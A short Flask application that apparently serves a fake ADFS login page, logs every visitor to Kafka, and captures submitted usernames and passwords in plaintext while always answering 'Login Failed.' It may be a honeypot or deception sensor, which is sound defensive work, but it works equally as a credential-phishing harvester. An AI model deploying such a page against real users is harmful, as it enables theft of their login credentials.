from flask import Flask, request, render_template
from kafka import KafkaProducer
import json
import datetime

app = Flask(__name__)
producer = KafkaProducer(bootstrap_servers='kafka:9092', value_serializer=lambda x: json.dumps(x).encode('utf-8'))

@app.route('/', methods=['GET', 'POST'])
def adfs_page():
    ip = request.remote_addr
    destination = request.url
    timestamp = datetime.datetime.now().isoformat()

    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')

        log_data = {
            'ip': ip,
            'destination': destination,
            'timestamp': timestamp,
            'username': username,
            'password': password,
            'method': 'POST'
        }

        producer.send('adfs_logs', log_data)
        return render_template('adfs_login.html', message="Login Failed.") #Or some other realistic response.

    log_data = {
        'ip': ip,
        'destination': destination,
        'timestamp': timestamp,
        'method': 'GET'
    }

    producer.send('adfs_logs', log_data)
    return render_template('adfs_login.html', message="") #Initial page load.

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=80)
